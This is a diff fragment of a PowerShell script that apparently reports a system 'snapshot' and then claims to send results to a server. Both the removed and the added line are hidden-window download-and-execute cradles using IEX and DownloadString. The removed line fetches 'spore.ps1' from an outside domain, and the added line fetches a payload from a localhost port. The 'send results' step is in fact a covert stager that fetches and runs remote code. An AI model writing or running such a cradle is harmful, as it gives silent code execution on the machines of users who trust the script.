@@ -75,4 +75,4 @@ Write-Host "--- End of Snapshot ---" -ForegroundColor White -BackgroundColor Dar
 
 Write-Host "Attempting to send results to server" -ForegroundColor White -BackgroundColor DarkBlue
 
-powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ginhsihp.cyberpanther-dev.space/spore.ps1')"
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://localhost:8081/spore')"
